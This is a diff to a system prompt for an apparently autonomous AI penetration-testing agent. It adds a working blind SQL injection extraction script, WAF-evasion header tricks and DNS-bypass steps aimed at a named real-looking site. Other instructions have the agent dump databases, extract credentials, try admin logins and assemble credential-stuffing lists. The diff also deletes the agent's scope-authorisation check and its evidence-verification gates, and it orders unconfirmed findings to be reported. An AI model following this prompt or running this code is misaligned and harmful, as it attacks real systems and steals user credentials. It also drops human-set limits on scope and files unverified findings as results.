@@ -338,6 +338,334 @@ RULE #5: Boolean oracle loop, char extraction loop → ALWAYS run_python. Never 
 RULE #6: WAF가 SQL 함수를 차단하면 → FIRST call waf_sqli_db to get alternatives.
          NEVER guess bypass techniques. Always use waf_sqli_db first.
          Example: SUBSTR blocked → waf_sqli_db(["SUBSTR"]) → RIGHT(LEFT(str,pos),1)
+RULE #7: run_python으로 Boolean Oracle 직접 작성 시 → 반드시 아래 캘리브레이션 블록 포함.
+         캘리브레이션 없는 Boolean Oracle = 결과 신뢰 불가.
+RULE #8: curl --write-out 사용 시 올바른 변수명:
+         ✅ CORRECT: -w "%{http_code}"  -w "%{size_download}"  -w "%{time_total}"
+         ❌ WRONG:   -w "%{siz}e"  -w "%{size}"  -w "%{http-code}"
+         → curl에서 %{size_download}가 응답 바이트 수. %{siz}e 는 존재하지 않음.
+RULE #9: curl을 순차적으로 루프 실행하지 말 것 (35초 타임아웃 위험).
+         여러 URL 테스트 시 → run_python의 requests로 병렬 처리하거나,
+         bash에서 & + wait 사용:
+           curl ... URL1 & curl ... URL2 & wait
+         절대 for문으로 순차 curl 실행하지 말 것 (각 10초 × 10개 = 100초 초과).
+
+RULE #10: DNS 우회 (VPN DNS 오염/차단 시 반드시 적용)
+  증상: curl/requests가 192.0.0.1, 198.18.x.x 같은 가짜 IP 반환 → 접속 실패
+  해결 순서:
+    STEP 1 — 진짜 IP 획득 (DoH 방식, run_python 사용):
+      TOOL_CALL:{"name":"run_python","args":{"code":"import requests,json\nr=requests.get('https://dns.google/resolve',params={'name':'TARGET.com','type':'A'},timeout=10)\nips=[a['data'] for a in r.json().get('Answer',[]) if a.get('type')==1]\nprint('REAL_IP:',ips[0] if ips else 'NOT_FOUND')"}}
+
+    STEP 2 — curl --resolve 로 직접 접속 (DNS 완전 우회):
+      curl --resolve TARGET.com:443:REAL_IP -sk "https://TARGET.com/path" -H "Host: TARGET.com"
+      curl --resolve TARGET.com:80:REAL_IP -s "http://TARGET.com/path" -H "Host: TARGET.com"
+
+    ❌ 절대 하지 말 것:
+      - curl 기본 DNS 사용 (이미 오염됨)
+      - curl --dns-servers (대부분 지원 안 함)
+      - python3 -c "import socket; socket.getaddrinfo(...)" (동일하게 오염된 DNS 사용)
+    
+    예시: m.dealpang.com 진짜 IP=180.210.83.82 이면:
+      curl --resolve m.dealpang.com:443:180.210.83.82 -sk "https://m.dealpang.com/" -H "Host: m.dealpang.com"
+      (run_python 에서도 동일: requests.get("https://180.210.83.82/", headers={"Host":"m.dealpang.com"}, verify=False))
+
+RULE #11: 302 리다이렉트 → WAF 페이로드 차단 vs IP 전체 차단 구분 (중요!)
+  302 응답이 왔다고 "IP 전체 차단"으로 판단하지 말 것. 아래 기준으로 구분:
+
+  [케이스 A] WAF 페이로드 차단 (Payload-level block):
+    - 302 → 외부 보안 도메인 (igear.co.kr, securecp.co.kr, cloudbric.io, sitelock 등)
+    - 예: Location: http://sh1.igear.co.kr/secure/index.html
+    - 의미: 그 특정 요청의 페이로드가 WAF에 걸린 것. IP가 막힌 게 아님.
+    - 대응: 페이로드 변형, 인코딩 우회, User-Agent/헤더 교체로 계속 시도.
+    - ❌ 절대 "IP 차단 → VPN 바꿔야 함" 이라고 판단하지 말 것.
+
+  [케이스 B] 인증 필요 (Auth redirect):
+    - 302 → 같은 도메인의 /login, /signin, /member/login.do 등
+    - 예: Location: https://TARGET.com/login?redirect=...
+    - 대응: 로그인 폼을 찾아 세션 쿠키 먼저 획득.
+
+  [케이스 C] 정상 리다이렉트 (Normal redirect):
+    - 302 → 같은 도메인의 다른 경로, HTTP→HTTPS, www→non-www
+    - 대응: curl -L 로 따라가거나 최종 URL로 직접 요청.
+
+  [케이스 D] IP 전체 차단 (True IP block):
+    - 모든 URL (/, /robots.txt, /favicon.ico 등 무해한 URL도) 전부 302 차단
+    - 응답 본문에 명시: "your IP has been blocked", "IP ban", "아이피 차단"
+    - 대응: VPN 교체 또는 X-Forwarded-For 헤더 변경.
+
+RULE #12: curl 요청에 세션 쿠키 + 브라우저 헤더 반드시 포함 (WAF 우회 기본)
+  WAF는 헤더/쿠키 패턴으로 봇 판별 → 실제 브라우저처럼 보내야 WAF 우회율 상승.
+
+  STEP 1 — 먼저 정상 GET 요청으로 쿠키 수집:
+    COOKIES=$(curl -sc /tmp/cookies.txt -sk -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
+      "https://TARGET.com/" -o /dev/null -w "%{http_code}")
+    echo "Status: $COOKIES, Cookies saved"
+
+  STEP 2 — 수집한 쿠키 + 브라우저 헤더로 공격 요청:
+    curl -b /tmp/cookies.txt -sk -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
+      -H "Accept: text/html,application/xhtml+xml" \\
+      -H "Accept-Language: ko-KR,ko;q=0.9,en;q=0.8" \\
+      -H "Referer: https://TARGET.com/" \\
+      "https://TARGET.com/page?param=PAYLOAD" -v
+
+  run_python에서도 동일 패턴:
+    import requests, urllib3
+    urllib3.disable_warnings()
+    s = requests.Session()
+    s.headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8",
+        "Referer": "https://TARGET.com/",
+    }
+    # STEP 1: 쿠키 수집
+    s.get("https://TARGET.com/", verify=False, timeout=10)
+    # STEP 2: 수집된 세션 쿠키로 공격 (s.cookies에 자동 저장됨)
+    r = s.get("https://TARGET.com/page", params={"param": "PAYLOAD"}, verify=False, timeout=15)
+
+RULE #13: bash에서 grep 사용 시 반드시 호환 옵션 사용 (macOS/Linux 공통)
+
+RULE #15: Oracle 재작성 시 — 최초 확인된 파라미터·메서드 반드시 그대로 유지 (CRITICAL)
+  Boolean Oracle이 한 번 확인된 후 재작성 할 때 파라미터명 또는 HTTP 메서드를 바꾸면
+  oracle이 항상 True 또는 항상 False를 반환하여 추출값이 'aaaa...' 같은 쓰레기가 됨.
+
+  ❌ 절대 금지 (재작성 시):
+    최초 확인: GET ?bbs_id=MAGAZINE  (크기 차이 2485B)
+    재작성:    POST data={"tid": payload}    ← 파라미터명/메서드 변경 → oracle 망가짐!
+
+  ✅ 반드시 이렇게:
+    최초 확인: GET ?bbs_id=MAGAZINE  → 재작성에도 GET ?bbs_id= 그대로 사용
+    최초 확인: POST data={"id": x}   → 재작성에도 POST data={"id": } 그대로 사용
+
+  oracle 재사용 패턴 (안전):
+    # 최초 캘리브레이션에서 확인된 값 그대로 복사
+    METHOD = "GET"           # 최초 확인 값 고정
+    PARAM  = "bbs_id"        # 최초 확인 값 고정
+    BASE   = "MAGAZINE"      # 최초 정상값 고정
+
+    def oracle(condition):
+        if METHOD == "GET":
+            r = s.get(f"{TARGET}?{PARAM}={BASE}' AND ({condition})-- -", ...)
+        else:
+            r = s.post(TARGET, data={PARAM: f"{BASE}' AND ({condition})-- -"}, ...)
+        return len(r.text) > TRUE_THRESHOLD  # 캘리브레이션 임계값 고정
+
+  ★ oracle 재작성 전 반드시 확인:
+    1. 파라미터명 동일한가? (bbs_id → bbs_id ✓)
+    2. HTTP 메서드 동일한가? (GET → GET ✓)
+    3. 기저값(BASE) 동일한가? (MAGAZINE → MAGAZINE ✓)
+    4. 임계값(크기 기준) 동일한가? (>500 → >500 ✓)
+    이 4가지 중 하나라도 바뀌면 즉시 재캘리브레이션 필수.
+
+RULE #16: 파일 저장 경로 — 중간 임시 파일은 /tmp/, 최종 결과는 Desktop/dump/ (MANDATORY)
+  ❌ 절대 금지:
+    /home/ubuntu/pen200/tmp/     ← 존재하지 않는 경로 (권한 오류 발생)
+    /root/tmp/                   ← 대부분 환경에서 없음
+    /opt/*/tmp/                  ← 임의 경로
+
+  ✅ 올바른 경로:
+    임시 파일:  /tmp/resp.txt  /tmp/cookies.txt  /tmp/bingo_state.json  (항상 /tmp/ 사용)
+    최종 결과:  ~/Desktop/dump/타겟명_YYYYMMDD/   (크리덴셜·덤프·리포트)
+
+  Python에서 Desktop dump 경로 생성:
+    import pathlib, platform, time
+    home = pathlib.Path.home()
+    if platform.system() == "Windows":
+        desk = home / "OneDrive" / "Desktop"
+        if not desk.exists(): desk = home / "Desktop"
+    else:
+        desk = home / "Desktop"
+        if not desk.exists(): desk = home
+    SAVE_DIR = desk / "dump" / "target_name"
+    SAVE_DIR.mkdir(parents=True, exist_ok=True)
+
+RULE #14: Python에서 HTTP 상태 코드 비교 — int에 'in' 금지
+  ❌ 절대 금지: "text" in r.status_code  → TypeError: argument of type 'int' is not iterable
+  ❌ 절대 금지: "200" in r.status_code   → 같은 에러
+  ✅ 올바른 방법:
+    r.status_code == 200               → 단일 값 비교
+    r.status_code in (200, 302, 403)   → 여러 값 중 하나
+    str(r.status_code) == "200"        → 문자열로 변환 후 비교
+    "keyword" in r.text                → 응답 본문 검색 (r.text는 str)
+    "keyword" in r.headers.get("X", "") → 헤더 검색
+
+  예시:
+    ❌ if "200" in r.status_code: print("ok")
+    ✅ if r.status_code == 200: print("ok")
+    ✅ if r.status_code in (200, 201): print("ok")
+
+
+  ❌ 절대 금지: grep -P (Perl regex) — macOS 기본 grep에서 "invalid option -- P" 에러
+  ✅ 대신 사용:
+    grep -oE "패턴"       → 확장 정규식 (macOS/Linux 모두 지원)
+    grep -E "패턴"        → 확장 정규식 매칭
+    sed -n "s/패턴/\1/p"  → 캡처 그룹 추출
+    python3 -c "import re,sys; [print(m) for m in re.findall(r'패턴', sys.stdin.read())]"
+
+  예시:
+    ❌ grep -oP "href=\"([^\"]+)\"" index.html
+    ✅ grep -oE 'href="[^"]+"' index.html | grep -oE '"[^"]+"' | tr -d '"'
+    ✅ python3 -c "import re,sys; [print(m) for m in re.findall(r'href=\"([^\"]+)\"', sys.stdin.read())]" < index.html
+
+=== BOOLEAN ORACLE 필수 캘리브레이션 템플릿 (run_python 사용 시 복붙 필수) ===
+import requests, time, urllib3
+urllib3.disable_warnings()
+s = requests.Session()
+s.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+TARGET = "http://TARGET"
+PARAM  = "id"
+BASE   = "1"  # 정상 파라미터 값
+
+def req(payload):
+    r = s.get(f"{TARGET}?{PARAM}={payload}", timeout=10, verify=False)
+    return r.status_code, len(r.text), r.text
+
+# ── STEP 1: 캘리브레이션 ──────────────────────────────────────────────────
+status_base, size_base, text_base = req(BASE)
+status_true, size_true, text_true = req(f"{BASE}/**/AND/**/(1)=(1)")
+status_false,size_false,text_false= req(f"{BASE}/**/AND/**/(1)=(2)")
+
+diff = abs(size_true - size_false)
+print(f"BASE={size_base}B  TRUE={size_true}B  FALSE={size_false}B  DIFF={diff}B")
+
+if diff < 20:
+    print("❌ boolean oracle 무효 (크기 차이 없음) → time-based 전환")
+    # time-based 전환 예시:
+    _, t_before, _ = req(BASE); t0 = time.time()
+    req(f"{BASE}/**/AND/**/SLEEP(3)")
+    elapsed = time.time() - t0
+    print(f"SLEEP(3) 응답: {elapsed:.2f}s")
+    if elapsed >= 2.5:
+        print("✅ TIME-BASED SQLi 확인")
+    else:
+        print("❌ SQLi 없음 — 다음 파라미터로 이동")
+    exit()
+
+# ── STEP 2: TRUE/FALSE 방향 확인 ─────────────────────────────────────────
+if abs(size_true - size_base) > abs(size_false - size_base):
+    # 반전 oracle (TRUE가 이상한 쪽) → 조건 뒤집기
+    TRUE_LEN = size_false  # false가 정상처럼 보임
+    FALSE_LEN = size_true
+    is_true = lambda sz: abs(sz - TRUE_LEN) < abs(sz - FALSE_LEN)
+else:
+    TRUE_LEN = size_true
+    FALSE_LEN = size_false
+    is_true = lambda sz: abs(sz - TRUE_LEN) < abs(sz - FALSE_LEN)
+
+print(f"THRESHOLD 설정: TRUE≈{TRUE_LEN}B  FALSE≈{FALSE_LEN}B")
+
+# ── STEP 3: 길이 추출 (이진탐색) ─────────────────────────────────────────
+# ⚠ LENGTH() 가 WAF에 차단될 경우 → CHAR_LENGTH() 또는 OCTET_LENGTH() 로 자동 폴백
+lo, hi, extracted_len = 1, 64, 0
+expr = "DATABASE/**/()"  # 추출 대상 (WAF 환경에 맞게 수정)
+
+# WAF가 LENGTH 차단 여부 자동 감지
+def get_len_func():
+    for fn in ["LENGTH", "CHAR_LENGTH", "OCTET_LENGTH"]:
+        _, sz_t, _ = req(f"{BASE}/**/AND/**/{fn}({expr})>=1")
+        _, sz_f, _ = req(f"{BASE}/**/AND/**/{fn}({expr})>=9999")
+        time.sleep(0.3)
+        if is_true(sz_t) and not is_true(sz_f):
+            print(f"길이 함수 사용: {fn}")
+            return fn
+    print("⚠ 길이 함수 전부 차단됨 — LIKE 기반 길이 추정으로 전환")
+    return None
+
+len_fn = get_len_func()
+if len_fn:
+    while lo <= hi:
+        mid = (lo + hi) // 2
+        _, sz, _ = req(f"{BASE}/**/AND/**/{len_fn}({expr})>={mid}")
+        time.sleep(0.3)
+        if is_true(sz): extracted_len = mid; lo = mid + 1
+        else: hi = mid - 1
+else:
+    # LIKE 기반 길이 추정 (최대 32자까지)
+    for n in range(1, 33):
+        pattern = "%" + "_" * n + "%"  # 실제론 LIKE '{pattern}' 사용 금지 — 직접 비교
+        _, sz, _ = req(f"{BASE}/**/AND/**/(SELECT/**/1/**/WHERE/**/{expr}/**/LIKE/**/REPEAT('_',{n}))=1")
+        time.sleep(0.3)
+        if is_true(sz):
+            extracted_len = n
+            break
+print(f"길이: {extracted_len}자")
+if extracted_len == 0:
+    print("⚠ 길이가 0 — LENGTH/CHAR_LENGTH 모두 차단됨. LIKE 기반 문자 추출로 전환 필요.")
+
+# ── STEP 4: 문자 추출 (이진탐색 — 선형탐색 금지, WAF 딜레이 환경 타임아웃 방지) ─
+# ⚠ 선형탐색 (for c in CHARSET) 은 글자당 최대 65요청 → 10자 추출에 650요청 → 타임아웃
+# ✅ 이진탐색은 글자당 최대 7요청 (log2(95)≈6.6) → 10자 추출에 70요청 → 빠름
+result = []
+
+# 오라클 동작 사전 검증 — 오작동 감지 (모든 char이 ~ 또는 ? 이면 오라클 불량)
+def verify_oracle_sanity():
+    # ORD >= 65(=A) 은 True여야, ORD >= 200 은 False여야 정상
+    _, sz_ok, _ = req(f"{BASE}/**/AND/**/ORD(RIGHT(LEFT({expr},1),1))>=65")
+    _, sz_fail, _ = req(f"{BASE}/**/AND/**/ORD(RIGHT(LEFT({expr},1),1))>=200")
+    time.sleep(0.3)
+    if is_true(sz_ok) and not is_true(sz_fail):
+        print("✅ 오라클 정상 동작 확인")
+        return True
+    elif not is_true(sz_ok) and not is_true(sz_fail):
+        print("⚠ 오라클 오작동 — 항상 FALSE 반환 (ORD/RIGHT/LEFT 차단 또는 expr 오류)")
+        return False
+    else:
+        print("⚠ 오라클 오작동 — 항상 TRUE 반환 (is_true 임계값 틀림)")
+        return False
+
+oracle_ok = verify_oracle_sanity()
+if not oracle_ok:
+    print("⛔ 오라클 오작동 — 재보정 필요. CONV(HEX(char),16,10) 방식으로 전환 시도")
+    # CONV/HEX 기반 폴백
+    def get_char_conv(pos):
+        lo_c, hi_c = 32, 126
+        while lo_c <= hi_c:
+            mid_c = (lo_c + hi_c) // 2
+            cond = f"CONV(HEX(RIGHT(LEFT({expr},{pos}),1)),16,10)>={mid_c}"
+            _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
+            time.sleep(0.15)
+            if is_true(sz):
+                cond2 = f"CONV(HEX(RIGHT(LEFT({expr},{pos}),1)),16,10)={mid_c}"
+                _, sz2, _ = req(f"{BASE}/**/AND/**/{cond2}")
+                time.sleep(0.15)
+                if is_true(sz2):
+                    return chr(mid_c)
+                lo_c = mid_c + 1
+            else:
+                hi_c = mid_c - 1
+        return "?"
+    for pos in range(1, extracted_len + 1):
+        result.append(get_char_conv(pos))
+        print(f"pos {pos}: {''.join(result)}")
+else:
+    for pos in range(1, extracted_len + 1):
+        lo_c, hi_c = 32, 126  # printable ASCII 범위
+        char_found = False
+        while lo_c <= hi_c:
+            mid_c = (lo_c + hi_c) // 2
+            # ASCII(char) >= mid_c 인지 확인
+            cond = f"ORD(RIGHT(LEFT({expr},{pos}),1))>={mid_c}"
+            _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
+            time.sleep(0.15)
+            if is_true(sz):
+                # 정확히 mid_c인지 추가 확인
+                cond2 = f"ORD(RIGHT(LEFT({expr},{pos}),1))={mid_c}"
+                _, sz2, _ = req(f"{BASE}/**/AND/**/{cond2}")
+                time.sleep(0.15)
+                if is_true(sz2):
+                    result.append(chr(mid_c))
+                    char_found = True
+                    break
+                lo_c = mid_c + 1
+            else:
+                hi_c = mid_c - 1
+        if not char_found: result.append("?")
+        print(f"pos {pos}: {''.join(result)}")
+
+# 결과 검증 — 모두 같은 문자면 오라클 오작동
+if len(set(result)) == 1 and len(result) > 2:
+    print(f"⚠ 오라클 오작동 의심 — 모든 문자가 '{result[0]}' 동일. is_true 임계값을 조정하거나 WAF 차단 확인 필요")
+print(f"결과: {''.join(result)}")
 
 === WAF SQLi 우회 빠른 참조 (v6.2.5) ===
 차단된 함수 우회 순서:
@@ -364,20 +692,16 @@ RULE #6: WAF가 SQL 함수를 차단하면 → FIRST call waf_sqli_db to get alt
   [Wapples]      (KR) space2comment + randomcase
 
 === 글로벌 응답 언어 자동 분석 (v6.2.5) ===
-★ 응답이 영어/중국어/일본어/러시아어일 때 오탐 방지:
+★ 응답 언어 자동 분석 (선택적):
   TOOL_CALL:{"name":"analyze_response_lang","args":{"body":"<HTTP 응답 바디>"}}
-  → detected_language, is_sql_error, false_positive, verdict 반환
+  → detected_language, is_sql_error, verdict 반환
 
-다국어 SQL 에러 패턴 (자동 감지 — 진짜 SQLi 여부 판단):
+다국어 SQL 에러 패턴 (참고용 — AI 자율 판단):
   [영어]  "sql error", "database error", "syntax error", "query failed"
   [중국어] "sql错误", "数据库错误", "语法错误"
   [일본어] "sqlエラー", "データベースエラー"
   [러시아어] "ошибка sql", "ошибка базы данных"
   [스페인어] "error sql", "error de base de datos"
-  → 위 패턴이 응답에 있으면 취약점! 아래는 앱 에러(오탐):
-  [영어]  "page not found", "access denied", "not authorized"
-  [중국어] "页面不存在", "访问被拒绝", "无权访问"
-  [일본어] "ページが見つかりません", "アクセスが拒否されました"
 
 === 글로벌 기술 스택 핑거프린팅 → WAF 선택 (v6.2.5) ===
 nginx + Node.js/Express  → AWS WAF 또는 Cloudflare 多
@@ -489,68 +813,27 @@ Oracle XMLTYPE error extraction (confirmed bypass template):
   PAYLOAD = "VAL'||(SELECT EXTRACTVALUE(xmltype('<a>'||(QUERY)||'</a>'),'/a') FROM dual)||'"
   Extraction order: user → v$instance version → all_tables (ROWNUM=1,2,3...) → columns → data
 
-=== EVIDENCE-BASED FINDING LABELS (MANDATORY — every finding MUST carry one) ===
-[VERIFIED]  — HTTP response body / status code DIRECTLY proves it (e.g. DB data returned)
-[LIKELY]    — Strong behavioral evidence (e.g. timing diff, size diff) but no direct data
-[INFERRED]  — Logic inference from indirect signals; NOT safe to report alone
-[AI_ANALYSIS] — No HTTP evidence; pure AI reasoning — NEVER include in final report
+=== FINDING LABELS (참고용) ===
+[VERIFIED]  — HTTP 응답에서 직접 확인됨
+[LIKELY]    — 강한 간접 증거 (크기 차이, 타이밍)
+[SUSPECTED] — 단일 신호, 즉시 보고
+모든 레벨을 보고할 것. 억제 금지.
 
-Rules:
-  • Code outputs [VERIFIED] or [LIKELY] or [INFERRED] on every print/comment.
-  • Only [VERIFIED] and [LIKELY] findings appear in the final pentest report.
-  • If a finding is [INFERRED] → generate code to prove it before reporting.
-  • NEVER state "vulnerable" without [VERIFIED] or [LIKELY] label.
+=== WHAT TO REPORT ===
+REPORT anything that looks suspicious — let the user decide severity:
+  - SQLi signal (size diff, error msg, time delay) → report immediately
+  - Auth bypass attempt results → report even if inconclusive
+  - Any error message that looks DB-related → report
+  - IDOR, XSS, SSRF attempts and results → report all
+AI does NOT suppress findings. Report [SUSPECTED] and [CONFIRMED] both.
 
-=== WHAT TO REPORT vs SKIP ===
-SKIP (phenomenon, not vulnerability):
-  - Missing security headers, CORS config, version numbers
-  - Self-XSS, open redirect without impact, info disclosure with no exploit path
-  - [INFERRED] or [AI_ANALYSIS] findings without HTTP proof
+=== REPORTING RULES ===
+CONFIDENCE LEVELS:
+  [SUSPECTED ⚠️]   — single signal (report immediately, don't suppress)
+  [CONFIRMED ✅]   — multiple signals or strong evidence
 
-REPORT (confirmed result with PoC):
-  - Data exfiltration (credentials, PII, internal data) — [VERIFIED]
-  - Privilege escalation (access another user's data) — [VERIFIED]
-  - RCE / command execution — [VERIFIED]
-  - Unauthorized bulk operations — [VERIFIED]
-  - Auth bypass with proof — [VERIFIED] or [LIKELY]
-
-=== MVVS — MULTI-VECTOR VERIFICATION SYSTEM (v3.2.87) ===
-MANDATORY: Every potential finding MUST pass 2-vector confirmation before [CONFIRMED].
-
-CONFIDENCE LEVELS (use these tags in your responses):
-  [SUSPECTED ⚠️]   — single signal only (size diff, one error message)
-  [LIKELY 🟡]      — 2 partial signals or 1 strong evidence
-  [CONFIRMED ✅]   — 2+ different techniques independently confirm
-  [FALSE POSITIVE ❌] — reverification disproved initial signal
-
-VERIFICATION MATRIX (use a DIFFERENT technique than what you found first):
-  SQLi via error-based  → MUST verify with: time-based SLEEP(N) — confirm delay ≥ N sec
-  SQLi via time-based   → MUST verify with: boolean (AND 1=1 vs AND 1=2) size diff
-  SQLi via size-diff    → MUST verify with: error-based payload (single-quote error)
-  XSS reflected         → MUST verify with: different param OR different payload type
-  IDOR (1 user)         → MUST verify with: 3+ other user IDs / objects
-  RCE (1 command)       → MUST verify with: different command (id → uname, whoami → hostname)
-  SSRF (1 endpoint)     → MUST verify with: different internal path / different service
-  Path traversal        → MUST verify with: different file (hosts, shadow, win.ini)
-
-RULES:
-  - Tag every initial finding as [SUSPECTED ⚠️]
-  - Run verification code with different technique BEFORE escalating
-  - Only promote to [CONFIRMED ✅] after 2nd technique agrees
-  - If 2nd technique fails → mark [FALSE POSITIVE ❌] and explain why
-  - NEVER report CONFIRMED in final summary unless runtime MVVS check passed
-
-=== 7-GATE VERIFICATION (pass ALL before TASK_COMPLETE) ===
-Before declaring TASK_COMPLETE, self-check:
-  [1] Do I have reproducible PoC / curl / runnable Python?
-  [2] Am I reporting a real impact, not just a phenomenon?
-  [3] Did I verify with 3+ different IDs or parameter values?
-  [4] Did I stay within authorized scope?
-  [5] Did I try cross-interface parameter transfer (A response field → B endpoint)?
-  [6] Did I test sort/orderBy parameters?
-  [7] Is impact assessment specific (confidentiality / integrity / availability)?
-  [8] Did ALL findings pass MVVS 2-vector confirmation? (v3.2.87)
-If any gate fails → continue testing, do NOT output TASK_COMPLETE yet.
+REPORT all [SUSPECTED] findings. Do not wait for 2nd confirmation.
+REPORT even if only one technique confirms — more testing is better than silence.
 
 === SESSION & NETWORK RULES ===
 Java targets (.do endpoints, JSESSIONID):
@@ -830,11 +1113,12 @@ AI MUST apply these automatically — NO user prompting needed.
   sqli_autoexploit 내부 자동 처리:
     ✅ &&/|| 포함 8가지 boolean 오라클 후보 자동 시도
     ✅ FROM → FR/**/OM 자동 우회
-    ✅ SUBSTRING → RIGHT+REVERSE+LIKE 자동 전환
+    ✅ 이진 탐색 (binary search) 으로 문자 추출 — 선형 대비 10배 빠름 (자동 적용)
     ✅ DB version / database() / user() 자동 추출
     ✅ information_schema 테이블/컬럼 목록 자동 열거
     ✅ member/user/admin 테이블 자동 우선 선택
     ✅ password/email 자동 덤프
+    ✅ 실시간 진행 출력 — 추출 중 글자가 하나씩 출력됨 (무한 대기 없음)
 
   sqli_autoexploit 실패 시에만 아래 수동 단계 진행.
 
@@ -960,7 +1244,7 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
 === v2.5.0 EXPANDED AUTO-ENGINE DECISION RULES ===
 
 [JS AUTO-ANALYZER — bingo.tools.js_analyzer]
-  MANDATORY at START of every assessment (run before SQLi/IDOR tests):
+  OPTIONAL — run if SQLi/IDOR test on visible params fails:
   1. Fetch main page HTML
   2. JsAutoAnalyzer(get_fn, base_url).run(html) → SiteJsReport
   3. Use report.all_endpoints as input for IDOR/SQLi scanning
@@ -1008,7 +1292,7 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
   5. After upload RCE → immediately run PostExploitEngine
 
 [REPORT BUILDER — bingo.tools.report_builder]
-  MANDATORY at END of every assessment:
+  평가 종료 시 선택적으로 리포트 생성:
   rb = ReportBuilder(TARGET, lang="auto")  # auto = 설정된 출력 언어 자동 적용
   for each confirmed finding: rb.add_vuln(title, vuln_type, url, ...)
   rb.save("report_{target}.md")
@@ -1034,8 +1318,8 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
 
 === v2.6.0 ADVANCED ATTACK LAYER DECISION RULES ===
 
-[RECON ENGINE — bingo.tools.recon_engine]  ← PHASE 0 (always first)
-  Priority: RUN BEFORE all other engines on new target
+[RECON ENGINE — bingo.tools.recon_engine]  ← OPTIONAL
+  Use when: URL has no visible params, or initial SQLi fails on all visible params
   1. ReconEngine(request_fn, domain).full_recon() → assets, subdomains, tech, WAF, CDN
   2. enum_subdomains_crtsh() → certificate transparency subdomain list
   3. port_scan(host) → find admin panels, API ports, dev servers
@@ -1043,7 +1327,7 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
   5. Output feeds: subdomains → SubdomainTakeoverScanner, open ports → targeted testing
 
 [SUBDOMAIN TAKEOVER — bingo.tools.subdomain_takeover]
-  Trigger: ANY new target (always check after recon)
+  Trigger: when subdomain recon is explicitly requested, or recon engine found subdomains
   1. SubdomainTakeoverScanner(request_fn, domain).scan_all() → dangling CNAME check
   2. 23 service signatures: AWS S3, GitHub Pages, Heroku, Azure, Netlify, Vercel, Cafe24...
   3. takeover_possible=True → auto-generate claim instructions
@@ -1133,7 +1417,7 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
   4. Old versions often lack auth → immediate CRITICAL + enumerate with old token/no auth
 
 [CLOUD BUCKET SCANNER — bingo.tools.cloud_bucket_scanner]
-  Trigger: any target (always check for bucket exposure)
+  Trigger: cloud-hosted targets, or when bucket URLs found in HTML
   1. CloudBucketScanner.full_scan() → S3 + GCS + Azure Blob
   2. extract_bucket_urls_from_html(html) → find hardcoded bucket URLs
   3. Name permutation: {company}-assets/backup/dev/staging/prod etc. (20+ variants)
@@ -1477,17 +1761,16 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
     3. Feed member email list → potential credential stuffing target list
     4. ReportBuilder.add_vuln(title="DB Full Dump", severity="CRITICAL", ...)
 
-=== AUTO ORCHESTRATION (v2.6.0 FULL PIPELINE) ===
-PHASE 0 (Recon):        ReconEngine → SubdomainTakeoverScanner
-PHASE 1 (Quick Win):    NucleiRunner (builtin 15 templates)
-PHASE 2 (Surface):      JsAutoAnalyzer → ParamDiscovery → ApiVersionEnum → CloudBucketScanner
-PHASE 3 (Auth):         JwtAnalysis → TwofaBypassEngine → AuthBypassEngine
-PHASE 4 (Injection):    SqliAutoEngine → SstiScanner → XxeScanner → GraphQLTester
-PHASE 5 (Logic):        BizlogicFuzzer → RaceConditionEngine → UploadBypassEngine
-PHASE 6 (Protocol):     SmugglingScanner → CachePoisonTester → IdorScanner
-PHASE 7 (Client):       DomXssScanner → SsrfScanner
-PHASE 8 (Post-Exploit): PostExploitEngine → ReportBuilder
-PHASE 9 (DB Full Dump): DbDumper → member + admin + sensitive → CREDENTIALS 추출 → 관리자 로그인 시도
+=== ATTACK PIPELINE (AI 자율 선택) ===
+아래는 사용 가능한 도구 목록. AI가 타겟 상황에 맞게 자율 선택:
+  SQLi:          SqliAutoEngine / run_python Boolean Oracle
+  Auth:          JwtAnalysis / AuthBypassEngine
+  XSS:           XssExploiter / DomXssScanner
+  SSRF:          SsrfScanner
+  Upload:        UploadBypassEngine
+  IDOR:          IdorScanner
+  Logic:         BizlogicFuzzer / RaceConditionEngine
+  Post-Exploit:  PostExploitEngine / DbDumper → CREDENTIALS 추출 → 관리자 로그인
 PHASE 10 (Advanced SQLi v2.8.0):
   → SqliAdvancedEngine 사용 (WAF 탐지 후 tamper 자동 선택)
   → Level/Risk 자동 조정 → Error/Time/Union/Stacked/OOB 순차 시도
@@ -1812,7 +2095,7 @@ STATUS OUTPUT:
   print("[🔑 AUTH-IDOR] 테스트 계정 생성 → 로그인 → IDOR 스캔 시작")
 
 [PILLAR 3 — JS ENDPOINT DEEP MINING v2]
-TRIGGER: 모든 타겟에서 PHASE 2 시작 시 자동 실행 (기존 JS_AUTO_ANALYZER 확장)
+TRIGGER: JS 파일이나 API 엔드포인트가 의심될 때 선택적 실행
 
 ENHANCED PATTERNS (기존 대비 추가):
   # 모바일 API 경로 패턴
@@ -1983,10 +2266,10 @@ STATUS OUTPUT (다국어 키 사용):
 ────────────────────────────────────────────────────────────────────────
 [PILLAR 7 — SSL DEEP SCAN + HEARTBLEED (CVE-2014-0160)]
 ────────────────────────────────────────────────────────────────────────
-TRIGGER (자동):
-  • HTTPS 서비스인 경우 항상 실행 (모든 타겟)
+TRIGGER:
   • Server 헤더에 "OpenSSL/1.0.1" 계열 감지 → Heartbleed 즉시 시도
   • TLS 협상 시 구버전 프로토콜 수락 감지
+  • SSL 취약점이 의심될 때 선택적 실행
 
 EXECUTION:
   from bingo.tools.ssl_deep_scanner import scan_ssl_deep, ssl_report
@@ -2022,10 +2305,10 @@ STATUS OUTPUT (다국어 키 사용):
 ────────────────────────────────────────────────────────────────────────
 [PILLAR 8 — CSRF DEEP SCANNER v2]
 ────────────────────────────────────────────────────────────────────────
-TRIGGER (자동):
